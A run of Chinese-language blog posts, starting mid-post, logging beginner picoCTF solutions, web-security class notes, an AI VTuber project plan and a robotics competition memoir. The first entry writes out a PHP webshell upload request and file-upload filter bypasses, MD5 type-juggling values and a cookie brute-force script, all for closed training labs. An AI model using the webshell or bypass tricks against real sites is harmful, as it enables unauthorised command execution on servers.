檔案，就可以從\nstatic.ltdis.strings.txt 中找到 Flag 了\n\n\n第二題：Nice netcat… \nnc 過去之後會噴很多數字出來，感覺像是 ASCII\n碼，所以就把他轉成文字就是 Flag 了，我寫了個簡單的程式\ntext = \"\"while True:    try:        num = int(input())        text += chr(num)    except:        breakprint(text)\n\n\nImage\n\n第三題：Obedient Cat \n就載下來印出來就是 Flag 了\n第四題：2Warm \n把 42 轉成 2 進位，然後用 picoCTF {} 包起來就是 Flag 了\n第五題：First Grep \n下載檔案後，用 grep 就能找到 Flag 了\n\n第六題：Bases \n用 base64 解碼就能得到 Flag 了\n\n\nImage\n\n上課紀錄 \nLanguage Trick - php \n\n簡單語法\n\nWeak type\n\n0e 開頭的東西會自動轉型成科學記號\n\n\n\n\n還有其他若型別轉換的範例，如下的真直表\n\nParameter Array\n\nLab - phpisnice\n\n雖然他 Lab 還是關掉了，但他有給 code ，所以我可以自己玩玩看!\n去查剛剛那些 MD5\n會有問題的字串 然後找到了這個\n\n\n\nString\nMD5\n\n\n\n\n0e215962017\n0e291242476940776845150308577824\n\n\n\n指定 A = 0e215962017 這題應該就能拿到 Flag 了\nLab - phpisbest\n\n因為他要先過 strcmp($A, $B) == 0\n所以先把兩個用成不一樣的陣列，這樣會 null == 0 -&gt; true\n就過了，然後 MD5 只要兩個都是陣列就會\nnull == null -&gt; true，就可以拿到 Flag 了\nFile vs Route\n\n\n\nWebshell (shell on web)\n惡意的 Webshell\n\n\n  POST /upload.php HTTP/1.1\\r\\nContent-Length: 80172\\r\\nContent-Type: multipart/form-data; boundary=----meow\\r\\n\\r\\n------owo\\r\\nContent-Disposition: form-data; name=\"upload\"; filename=\"ouo.txt\"\\r\\nContent-Type: text/plain\\r\\n\\r\\n(File Content)\\r\\n------owo--\\r\\n\n改成\nPOST /upload.php HTTP/1.1\\r\\nContent-Length: 80172\\r\\nContent-Type: multipart/form-data; boundary=----meow\\r\\n\\r\\n------owo\\r\\nContent-Disposition: form-data; name=\"upload\"; filename=\"webshell.php\"\\r\\nContent-Type: text/php\\r\\n\\r\\n&lt;?php system($_GET['cmd']);?&gt;\\r\\n------owo--\\r\\n\n怎麼抵擋呢?\n\n錯誤示範 - 用前端擋，可以輕易繞過\n\n檢查 File Content Type\n但是如果把 Request 的 Content-Type 改掉 (例如 image / png) 就可以 bypass\n了\n檢查 File signature\n\nmagic number: 透過檢查檔案的開頭幾個 byte 來判斷檔案類型\n\n但這東西也很容易被偽造，只要在前面加上簽名就可以了\n\n在前面加上 gif87a 後端就會以為上傳的是 gif\n\n副檔名\n\nwhitelist\nblacklist\n\n但需要全部都擋掉，不然把副檔名改成 phP\n之類的就可能可以繞過\n\n\nLab - uploader (lab 關掉了)\n照抄剛剛可以觸發 Webshell php，然後就能從根目錄取得 Flag 了\nLab - uploader-waf (lab 關掉了)\n他有改 content-type 和副檔名，所以要把前面的\nContent-Type: text/php 改成\nContent-Type: image/png，然後把副檔名改成 phP\n就可以繞過了，接下來就跟上一題一樣在根目錄取得 Flag\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day5","url":"/IThome_2024ironman_CTF_Day5/","content":"前言 \n本日進度：\n\n6 題 general\nskills\n【成大資安社社課】WEB\n1 - 到 Lab - Robots、gitleak\n\n\nWriteup \n第一題：convertme.py \n就單純把數字轉成二進位就結束了\n\n\nImage\n\n第二題：Codebook \n就把檔案下載執行，就結束了\n\n\nImage\n\n第三題：Magikarp Ground Mission\n\n按照指示連進 ssh 然後就一一把檔案 cat 出來最後組在一起就是 flag\n了\n\n\nImage\n\n第四題：Tab, Tab, Attack \n用 tab 移動到 flag 的位置，然後執行就有 flag 了\n\n\nImage\n\n第五題：Wave a flag \n把檔案下載之後，先用 chmod 讓他可以執行，在按照指示在後面加上\n-h 的參數就可以得到 flag 了\n\n\nImage\n\n第六題：Python Wrangling \n就看一下他程式碼，按照他加解密的方式把他給的密文和密鑰丟進去解就是答案了\n\n\nImage\n\n上課紀錄 \nWhat is web? \ngoogle\n搜尋背後做了甚麼\n\n\n Image\n\nOSI 模型的七層都是可以打的，但今天只會著重在第七層，也就是\nApplication layer 的打法\n\n\nImage\n\n分類 \n\n前端 (Frontend)\n\n瀏覽器 (Browser)\nLanguage：HTML、CSS、JavaScript\nFramework：Vue.js、React.js、jQuery…\nClient：Chrome、Firefox、Safari、Edge…\n攻擊方法：XSS、CSS Injrection、prototype pollution、DOM\nClobbering…\n\n後端 (Backend)\n\n伺服器 (Server)\nLanguage：Python、PHP、C …\nFramework：Flask、Larabel、gin…\nServer：Apache、Nginx、Gunicore…\n攻擊方法：LFI、Command Injection、SQL\nInjection、Serialization、SSTI、SSRF…\n\n\n前端會向後端發 request，後端會回傳 response\nHTTP Request \nPOST /cgi-bin/process.cgi HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)Host: example.vincent55.twContent-Type: application/x-www-form-urlencodedContent-Length: lengthAccept-Language: en-usAccept-Encoding: gzip, deflateConnection: Keep-AlivelicenseID=string&amp;content=string\nHTTP Response \nHTTP/1.1 200 OKDate: Day, 00 OOO 6666 11:11:11 TTTContent-Type: text/html&lt;!doctype html&gt;..\nHTTP status :\n2 開頭是成功，3 開頭是重新導向，4 開頭是客戶端錯誤，5 開頭是伺服器錯誤\nFronted roadmap \n\n\nImage\n\nBackend roadmap \n\n\nImage\n\n學習曲線 \nWeb security 是資安裡面最容易入門的領域?\n因為我們對 Web\n最熟悉，所以上手最快，但學到一定階段之後就會逐間趨緩，需要靠經驗累積和漏洞靈敏度去找漏洞\n\n\nImage\n\nWhy Web Security?\n(為甚麼要學 Web Security?) \n\n今年的金盾獎得獎名單可以透過改後面的數字在公告時間前就拿到\nowo\n\n\nImage\n\n出去玩~\n\n\nImage\n\n賺錢錢 - Bug Bounty\n而且其實 Bug Bounty 是在比耐心和漏洞的靈敏度，難度不會比 CTF 高\n\n\nImage\n\nPwn2Own\n\n\nImage\n\nHacking Moodle 點名\n\n\nImage\n\n點名密碼有八碼很難爆破\n\n\nImage\n\n但 qrpass 是一個 1000~9999 的數字，所以是可爆破的\n\n\nImage\n\n\n\n\nImage\n\nWeb Base \n\nHTML -&gt; 骨架\nCSS -&gt; 皮膚\nJavaScript -&gt; 會動了\n\n\n\nImage\n\n\nCookie\n\n\n這樣就取得管理員權限了 owo\n好用的\nCookie extension\nSession vs.&nbsp;Cookie\n剛剛改 Cookie 會直接變 admin 這樣太不安全了，其中一個解決的方法就是用\nSession ID 來辨識身分，把 Data 存在 Server 上 (Session Data)， Cookie\n只有包含 Session ID，用 Session ID 去查找，就不會有問題了\n\n\nSessionID\n的產生方式跟前面說的一樣，通常會是一個無法猜測的亂數。你可能會想說：「很難猜是一回事，但機率不是\n0\n阿！」，對，的確是有機率能夠猜到，但是那個機率太低太低了（例如說幾千億分之一之類的）。而且\nServer 在你亂猜猜錯幾次之後就有可能把你 ban\n掉不讓你繼續猜，所以沒什麼問題。\n不過這邊要特別注意的一點是 SessionID\n基本上是種認證不認人的方式，也就是說一旦你的 SessionID\n被偷走，別人就可以偽造你的身份來登入了。而這個 SessionID 通常都是保存在\nCookie 之中。\n這就是為什麼有些網站發生駭客入侵的情形之後你會突然被登出，因為駭客可能偷到一批\nSessionID，這時候伺服器就會把所有 Session\n資料全部清空，以故事來比喻就是把筆記本丟掉，買一本新的，這樣被偷走的那些\nSessionID 就沒用了，而 Server 找不到你的\nSessionID，自然就無法登入，因此把你給登出了。\n網站發生問題時客服會要你先把 Cookie 清掉也是類似的道理，因為 Cookie\n跟狀態有關，有時候可能程式有一些 bug，把你導到了錯誤的狀態，把 Cookie\n清空等於把狀態清空，重新再開始，就有可能變得正常。\nby 白話\nSession 與 Cookie：從經營雜貨店開始\n\n(或是把 cookie 的資訊加密 (Cookie-based session) ，只有 server\n知道怎麼解密，這樣也能夠保護，但缺點就是 cookie\n的長度是有限制的，太大瀏覽器就不幫你存了，或是哪天加密方式被破解，那就一樣會被偽造了)\nLab - Cookie\n跟昨天改 cookie 的那題很像，而且甚至不需要一個個猜，就把 cookie 改成\ncookie_monster 就好了，阿但 Lab 關了我沒辦法是 qaq\n\n\nImage\n\nhash\n\n不一樣的東西 hash 之後會不一樣，一樣的 hash 之後會一樣\n不可逆，不能從 hash 值反推原本的東西\n常見的 hash function: md5 (不安全), sha1 (不安全),\nsha256 (目前常用的)…\nhash collision: 兩個不一樣的東西 hash 之後一樣，這就是不安全的\nhash\n\nEncoding\n\n\nImage\n\n常見的 encode function: base64, urlencode…\nTools:\n\nF12: Developer Tools\ncurl: 可以用來發送 http request 的工具\n\n\nImage\n\nCheatsheet\n\nLab - Redirect (題目關了🥲)\n\n這題式按下 Get flag\n之後會跳到一個某個網址，但又會馬上轉回來，所以就只要開發者工具打開\nNetwork 看按下去之後轉址去了哪，然後用 curl 把內容抓下來就可以了\n\n\n\nLab - ShibaShop (題目關了🥲)\n\n先隨便買一個東西，然後把 buy\n的金額改成負的，這樣錢就就會變多，再找到 flag 購買的地址，就可以買 flag\n了，然後 flag 就出來了 /\n\n怎麼打\n\n\nError message 可以看 404 頁面\n好用插件\n\n什麼是黑箱，甚麼是白箱\n\n黑箱只能靠自己慢慢戳，白箱就是有 code 可以看背後邏輯\n\nInfo Leak: Turn black box to white box\n\n\n\n酷酷插件，自動幫你有沒有\ngit leak 爽爽拿 0day\n藉由 gitleak\n將整份程式還原出來，從黑箱變白箱\n\n\n\n\nLab - Robots (題目關了🥲)\n\n點到 Robots.txt 中設定成 disable 的網址，打開就有了\n\nLab - gitleak (題目關了🥲)\n\n用上面的那個工具把整份檔案用出來，然後到 .env 中找到\nflag\n\n\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day4","url":"/IThome_2024ironman_CTF_Day4/","content":"前言 \n本日進度：\n\n6 題 general\nskills\n\n\nWriteup \n第一題：PW Crack 2 \n題目有把檢查密碼的程式給出來，那就直接叫輸入是他檢查的密碼，然後就可以得到\nflag 了\n把原本程式中的 def level_2_pw_check() 改成這樣：\ndef level_2_pw_check():    # user_pw = input(\"Please enter correct password for flag: \")    if( user_pw := chr(0x64) + chr(0x65) + chr(0x37) + chr(0x36) ):        print(\"Welcome back... your flag, user:\")        decryption = str_xor(flag_enc.decode(), user_pw)        print(decryption)        return    print(\"That password is incorrect\")\n然後執行就會有答案摟~\n\n\nImage\n\n第二題：PW Crack 1 \n好像不小心先做到第二題了 xd\n，這題跟上一題一樣，就是把答案改成他想要的文字就好了，差異是上一題是用\nASCII 編碼，這邊是直接給字串，但對我來說都沒差，反正我都用海象 /\ndef level_1_pw_check():    # user_pw = input(\"Please enter correct password for flag: \")    if( user_pw := \"1e1a\"):        print(\"Welcome back... your flag, user:\")        decryption = str_xor(flag_enc.decode(), user_pw)        print(decryption)        return    print(\"That password is incorrect\")\n\n\nImage\n\n第三題：HashingJobApp \n這題要使用 MD5\nHash，因為不知道他是甚麼所以我查了一下，大概是這樣子：\nMD5 這個演算法他會將任意長度的數據映射為一個固定 128\n位元的輸出，那他做的步驟如下：\n\nPadding：將原始訊息的位元長度填充，直到滿足同餘 448 (mod\n512)，填充的數字會是一個 1 後面接著 n 個 0，然後接著再用 64\n位元的原始訊息長度\nInitialize：定義四個 32 位元的變數：\n\nA = floor(2^32 * abs(sin(1))) = 0x67452301\nB = floor(2^32 * abs(sin(2))) = 0xefcdab89\nC = floor(2^32 * abs(sin(3))) = 0x98badcfe\nD = floor(2^32 * abs(sin(4))) = 0x10325476\n聽說這樣可以讓 MD5\n的計算過程更加隨機，但好像有一些渾沌數學的東西，我不太懂之後會再回還看看\n\nProcess：接著將填充後的訊息每 512\n位元分成一組，然後分別做四輪 64 次的操作，最後的結果就是 MD5 的 Hash\n值，至於詳細內容可以看 這裡\n\n因為想說可以用昨天剛學的 pwn.remote\n來玩玩看，所以就寫了個程式：\nimport hashlibimport pwnio = pwn.remote(\"saturn.picoctf.net\", 51742)while True:    try:        io.recvuntil(b\"quotes: '\")        input_string = io.recvline().decode()[:-3]        md5_hex = hashlib.md5(input_string.encode()).hexdigest()        print(f\"{input_string} : {md5_hex}\")        io.sendline(md5_hex.encode())    except:        io.recvuntil(b\"Correct.\\r\\n\")        flag = io.recv()        print(flag.decode().strip())        breakio.interactive()\n\n\nImage\n\n第四題：Glitch Cat \n就簡單把它傳出來的字串和字元丟到 python 裡就是答案了\n\n\nImage\n\n第五題：fixme2.py \n直接把判別是砍掉，就會直接輸出 flag 了\nif flag = \"\":  print('String XOR encountered a problem, quitting.')else:  print('That is correct! Here\\'s your flag: ' + flag)\n變成\nprint('That is correct! Here\\'s your flag: ' + flag)\n\n\nImage\n\n第六題：fixme1.py \n又不小心先寫了第二題，這題更簡單，就把錯誤的縮排改正就好了\nprint('That is correct! Here\\'s your flag: ' + flag)\n變成\nprint('That is correct! Here\\'s your flag: ' + flag)\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day3","url":"/IThome_2024ironman_CTF_Day3/","content":"前言 \n本日進度：\n\n6 題 general\nskills\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵 - 看完\n\n\nWriteup \n第一題：Blame Game \n去翻 git log ，發現最下面有個 Author 長的一副 flag\n的格式，然後試一下就對了 噎\n\n\nImage\n\n第二題：binhexa \n就用 nc 連上之後依序回答問題就可以得到 flag 了\n\n\nImage\n\n第三題：repetitions \n把載下來的東西印出來看起來就是 base64\n過的東西，但解過一次之後還是亂的，看起來又是個\nbase64，所以就再解，因為覺得這樣太累了，所以就寫了個 python\n去解，然後就得到 flag 了~\nimport base64text = '''VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVhRmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNkMlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVWVkpEVGxaYVdFMVhSbFZrTTBKVVZXcE9VazFXV2toT1dHUllDbUY2UWpSWk1GWlhWa2RHZEdWRlZsaGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg=='''while True:    print(text)    text = base64.b64decode(text).decode('utf-8').replace('\\n', '')\n\n\nImage\n\n第四題：Big Zip \n解壓縮他給的檔案後，資料夾中裡面有超多的檔案，所以就用\ngrep 來配對 picoCTF{.*} ，然後就找到 flag\n了~\n\n\nImage\n\n第五題：First Find \n使用 find 指令，找到名為 uber-secret.txt\n的檔案，印出來就是 flag 了\n\n\nImage\n\n第六題：runme.py \n有點太簡單，就是直接 Run 就印出來了 /\n\n\nImage\n\n上課紀錄 \nLab 3 - cookies \n發現輸入 snickerdoodle 會出現\nThat is cookie! Not very special though...，並且這時去查看\ncookie 會發現有一個 name 的索引為 0\n，但是在一般的時候 name 是 -1 ，然後如果改成\n1, 2, 3...\n會有不同回應，所以就寫一個程式去窮舉看看，就像下面那樣，最後就發現在\nname 為 18 的時候會出現 flag\n\n\nImage\n\nimport requestsimport threadingurl = 'http://mercury.picoctf.net:54219/check'cookie = {\"name\": \"1\"}def try_cookie(i):    cookie[\"name\"] = str(i)    r = requests.get(url, cookies=cookie, allow_redirects=False)    # print(\"trying:\" + str(i), r.status_code)    if r.status_code == 200 and \"picoCTF\" in r.text:        print(\"trying:\" + str(i), r.text)        print(r.text)for i in range(1000):    threading.Thread(target=try_cookie, args=(i,)).start()\n\n\nImage\n\npwntools \npwn : 就是去找 Binary 檔的漏洞\n基本語法\n\nInteraction\n\nio = pwn.process(\"cmd.exe\") : 跟一個程序互動 (這裡是\ncmd.exe)\nio = pwn.remote(\"host\", port) : 跟遠端主機互動\nio.interactive() : 進入互動模式\nio 這個物件創出來之後，後面就都是用 io\n來與 程序 或是 遠端主機 互動\n\nSend\n\nio.send(\"whoami\\n\") : 送出指令\nio.sendline(\"whoami\") : 送出指令並且加上換行\n\nRecv\n\nio.recv(1024, timeout=1) :\n接收回傳，第一個參數是接收的大小 (byte)，第二個參數是 timeout\n(最多等待多久)\nio.recvline() : 接收回傳並且換行\nio.recvuntil(\"end\") : 接收回傳直到遇到\nend\nio.recvlines(2) : 接收回傳兩行\n\n\nLab 4 - echo \n就是根據遠端主機的提示，將一模一樣的文字傳回去，然後就會出現\nflag，但因為主機已經關了，所以我就只有寫好程式，但應該是會對的啦 owo\nimport pwnio = pwn.remote('140.116.246.190', 8787)while True:    try:        io.recvuntil('Repeat after me:\\n')        echo = io.recv()        print(echo)        io.send(echo)    except:        breakio.interactive()\nLab 5 - eval \n跟 echo 很像，但變成算 1000 道數學題，都算對之後就會給 Flag\n了，然後跟上一題一樣，主機已經關了，所以我就只有寫程式，沒有實際測過\nimport pwnio = pwn.remote(\"140.116.246.190\", 8788)while True:    try:        io.recvuntil(\"Solve the problem: \")        question = io.recv()        ans = eval(question)        print(question.decode(), ans)        io.sendline(str(ans))    except:        breakio.interactive()\nLAB 6 – b33fer overflow \n這邊聽不是很懂，有大概理解它的原理就是要把 stack 塞爆，一路塞到\nreturn addr 的位置，這邊的題目是要跳到 win\n的地方，然後就會出現\nflag，但我其實不太知道實作細節，所以目前就先不寫他了，之後便更強了再說\n(主要是今天死線快到了，來不及研究 lol)\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day2","url":"/IThome_2024ironman_CTF_Day2/","content":"前言 \n本日進度：\n\n6 題 general\nskills\n第一堂課比較簡單就拆兩次看就好，【成大資安社社課】手把手 Python 教學\n— 從入門到入侵 - 看完 Requests\n\n\nWriteup \n第一題：Binary Search \n用 ssh 連線，然後開始手動二分搜，找到 flag\n\n\nImage\n\n第二題：Time Machine \n先把檔案載下來，然後解壓縮之後發現裡面有個 txt 檔和 .git 資料夾，txt\n檔的訊息講說要去看他的 commit history，所以就用 git log\n看了一下，就直接看到 flag 了\n\n\nImage\n\n\n\nImage\n\n第三題：Super SSH \n按照指示登入，然後就看到 flag 了\n\n\nImage\n\n第四題：endianness \n用 Netcat 連線，然後按照指示將字串轉換成 big endian 和 little\nendian，就得到 flag 了\n得到的 word: ofbay\n\n\n\nchar\nhex\n\n\n\n\no\n6f\n\n\nf\n66\n\n\nb\n62\n\n\na\n61\n\n\ny\n79\n\n\n\nbig endian: 6f66626179\nlittle endian: 796162666f\n\n\nImage\n\n第五題：Commitment Issues \n先看看 message.txt ，他說 TOP SECRET，然後裡面也有 .git\n資料夾，所以用 git log 看了一下，發現之前有一筆 commit message 寫\nremove sensitive info 所以就 checkout 到那個\ncommit，然後再印出一次 message.txt 看到 flag 了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第六題：Collaborative\nDevelopment \n一樣有 .git 資料夾，所以就用 git log\n看了一下，發現只有一筆，再回去看了一下題目說他是多人寫作的，所以看了以下有沒有其他\nbranch，果然，有其他另外三個，接著就把裡面的 flag.py\n都拿出來看看就有答案了，然後拚在一起就是 flag 了\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n上課紀錄 \n基本語法 \n\nhex\nbin\nord\nchr\nbase64.b64encode\n+, -, *, /,\n%, **, pow\nprint\nNUM, STR, FLOAT,\nLIST, TUPLE, SET,\nDICT, BOOL\nif, elif, else\nwhile, for\ntry...except...else...finally\neval:　會將輸入的 String\n自動轉換成適當的型態，所以如果是 python 指令，就會發生可怕的事情 owo\n(MyFirstCTF 的 Evil Calculator)\n\nLab 1 - 星星樹 \n我也要寫一行解~ 基本上跟 Vincent\n寫的一樣，但我把海象用在三元運算子上就能成功了，就沒用 lambda 了\nprint(\"\\n\".join(\" \" * (a - i) + \"*\" * (i * 2 - 1) for i in range(1, a + 1)) + \"\\n\" + \" \" * (a - 1) + \"|\") if (a := int(input())) else None\nLab 2 - caesar \n繼續一行解 lol\nprint(\"\".join(chr((ord(i)-ord(\"o\")+ord(\"b\")-97+26)%26+97) if i.isalpha() else i for i in \"o33s{cl7u0a_10ir_7nxvat_on7u5}\"))\nRequests \n包含的方法\n\n講了 get 和 post 的方法，然後就結束了~\n又修了一點插件 \n在寫的時候發現有一點小 bug:\n\n在 Practice\n頁面的時候如果是有翻頁或是有點選指定哪個類別時分數不會顯示，因為在\nhttps://play.picoctf.org/practice 後面還會加上\n?category=5&amp;page=1\n之類的文字，但我程式在寫的時候就只有判斷到\nhttps://play.picoctf.org/practice，所以就改成有包含到\nhttps://play.picoctf.org/practice\n這個字串就去抓分數，就解決了~\n顯示的分數不會即時更新，也就是在我解完一個新的題目的時候分數還會是舊的，需要重新整理才會刷新，因為我程式在寫的時候是判斷如果分數已經生成就不再生成一次，所以就改成每次都去檢查有沒有生成過了，如果每有就生一個一個新的，如果沒有就去更新舊的分數，這樣就沒問題了~\n\n小小心得 \n今天的題目好像有點太簡單，六題半小時不到就寫完了，寫 Writeup\n的時間比解的時間還多 xdd，希望之後也都能這麼順利 owo\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day1","url":"/IThome_2024ironman_CTF_Day1/","content":"前言 \n自從暑假參加了 AIS3\n遇到了各路大神，覺得自己實在太廢了，也聽到其實蠻多人推薦可以從打 CTF\n開始學習資安，所以就決定來參加 IThome 2024 鐵人賽，想藉由一直刷 CTF\n題目，希望結束之後可以稍稍變強一點。\n\n本來想說這次就以 5000 分為目標，結果我打開 Pico\nCTF，結果發現上面怎麼都沒有分數，然後花了大概一個小時在找到底我哪邊沒設定好，結果一問之下才知道是因為\nPico CTF\n過去各年的題目難易度對應分數並不一致，以至於相同難度的題目在不同的年份可能會有不同的分數，所以就把分數這個標準拿掉了。\n不過我還是覺得有個分數感覺會比較爽，然後正巧也有人在 Pico CTF 的 DC\n社群上講了差不多的想法，那麼，我就來做個插件吧~\n所以 Day1 的目標就從規劃進度 + 寫題目，鬼轉成了規劃進度 + 寫個生成 Pico\nCTF 分數的酷酷插件 XD\n\n\n在 Pico CTF 的 DC\n社群上剛好遇到有人有一樣的想法\n\n規劃 \n上課 \nDay2 ~ Day30 每三天看一部 Beef Soup 的影片，雖然這樣 30\n天過去也不會全部看完，但也就算了，事情太多了 owo\nPico CTF 刷題 \n\nDay2 ~ Day9\n每天 6 題 general skills\nDay10\n3 題 general skills + 3 題 web (如果真的不會也找不到 writeup\n可以用隨便一題 medium 代替)\nDay 11 ~ Day 19\n每天 6 題 web (如果真的不會也找不到 writeup 可以用隨便一題 medium\n代替)\nDay 20 ~ Day 30\n每天 6 題 crypto (如果真的不會也找不到 writeup 可以用隨便一題 medium\n代替)\n\n寫酷酷插件 \n主要是寫個程式在 Practice 介面和 User Profile 介面顯示 picoGym\n的分數，分數的算法就跟上面那個人講的一樣：\n\nEasy: 100 points\nMedium: 200 points\nHard: 300 points\n\n然後就是按照目前在哪一個頁面，去抓取對應的資料，並且算成分數，最後顯示在該頁面上。\n成果如下：\n\n\nPractice 介面\n\n\n\nUser Profile 介面\n\n這裡\n是插件的 Github 連結，有興趣的話可以去看看～\n然後很意外的是提交申請要上架，居然差不多一小時就好了，還以為要好幾天呢，可以在\n這裡\n安裝這個插件～\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 AI VTuber 的完善之路 - Day1","url":"/IThome_2024ironman_AI_VTuber_Day1/","content":"前言 \n高中畢業之後花了大概一個月的時間開發出了一套 AI VTuber\n的雛型，有測試直播過了，目前有 CLI 輸入、語音輸入、Youtube\n聊天室問答的功能，也就是完成了大概在雜談方面的開發，但這個月參加了各種活動以至於有點小小荒廢了這個專案，想在這個\nIThome 鐵人賽中至少完成：\n\n良好記憶系統\n點歌\n翻唱歌曲\n會玩一款遊戲\n開 5 場超過 50 人以上參與的直播測試\n\n希望我可以順利達成目標~\n之前測試的直播連結\n\n目前已有功能的流程圖 \nflowchart TB\noption[選擇輸入方式] --1--&gt; voice[語音輸入] --&gt; ASR --&gt; llm\noption --2--&gt; cli[CLI 輸入] --&gt; llm[\"LLM(文字)\"]\noption --3--&gt;chat[Youtube 聊天室隨機選擇] --&gt; llm\nllm --&gt; TTS\nTTS --&gt; v[VTS 轉換成嘴型]\nllm --&gt; obs[轉換成文字顯示在 OBS]\n然後上面比較有趣的應該是我的 LLM 是拿 Dcard 上的文章 finetune\n過的，有做過一些神奇處理，然後還有爬 Dcard\n文章真的是非常的有趣，這些之後可能會來分享一下。\n目標進度與細節 \n\n良好記憶系統 (Day2 ~ Day 8)\n\n應該會先使用 RAG\n做長期記憶系統，然後短期記憶就直接拿跟他對話的前面幾句話，但把記憶放在前面的模式好像會讓他蠻多幻覺，還會有一些很詭異的回覆，可能要再多做很多很多的\nPrompt Engineering 或是 finetune 看看\n\n點歌 (Day9 ~ Day10)\n\n這邊就比較簡單了，讓 LLM\n學會輸出某種指令後，可以從歌曲的資料庫中挑選一首他可能想要撥放的歌曲\n\n翻唱歌曲 (Day11 ~ Day15)\n\n這邊應該會套 So-VITS-SVC\n，但這東西我沒用過，感覺會有點久\n\n會玩一款遊戲 (Day16 ~ Day25)\n\n我其實一直很想讓 AI 完 MOBA\n類遊戲，但感覺這會有點太難，可能賽後再開一個鐵人賽才有機會 xd，所以這邊我想先選一點有點挑戰但又好像不會太難的，最好還有點創意，想來想去就決定是\n日麻 (應該就是用雀魂)\n\n開 5 場超過 50 人以上參與的直播測試 (Day2 ~ Day 30)\n\n反正有到一定進度就會開開直播測試，但其實可能會很困難?\n或者我可能要研究看看演算法，反正這目標就是先靠佛系經營\n\n\n","categories":["IThome 2024 鐵人賽","AI VTuber 的完善之路"],"tags":["IThome 2024 鐵人賽","AI VTuber","AI","GAI","ML","LLM"]},{"title":"2022 FRC New Taipei City x Hon Hai Regional","url":"/2022_FRC_New_Taipei_City_x_Hon_Hai_Regional/","content":"\n\n高中畢業老人的小小回憶錄\n\n\n🗓️ 比賽日期：2022/03/03 ~ 2022/03/06\n\n備賽期 \n我可能有差不多七成的寒假都待在社團吧，但其實我那時候很菜，做事搞不好還會拖慢進度，還好學長們都很有耐心的教導我們使用各種工具，但剛接觸的我們手工技巧太不純熟\n(雖然再過了一年還是差不多爛就是了)，一下切歪一下鑽錯孔，只能做一些打雜的工作，還記得當初花了一個下午用銼刀磨那些太粗的六角軸，或是用線鋸把五六片木板切成木條，還有實際參與一點程式的開發。總之就是一段挺累但可以看到自己慢慢對流程熟練，機器、場地慢慢完善的過程。\n上場摟 \n我應該算是機動，所以就到處跑來跑去，最深刻的應該就是在最後打聯盟賽的時候，大家喊\nBlue Alliance~ Blue Alliance~ Red Alliance~ Red\nAlliance~，真的超瘋，贏了之後還拿旗子跑一圈，那種激憤人心的場景是我當時覺得最有趣的事。\n心得 \n是說學長他們挺強的，尤其是從現在看回去，錢不算多，也沒有到多麼驚奇的大設計，但就是很穩，射球不算快但是很準，吊掛只能爬到\nMid\n但是可以很快，就是這樣平穩地發揮最後全場平均得分排名第三，也不知道是不是因為這樣的特性得到\nIndustrial Design Award，就如同這個獎的描述一樣\n\nCelebrates the team that demonstrates industrial design principles,\nstriking a balance between form, function, and 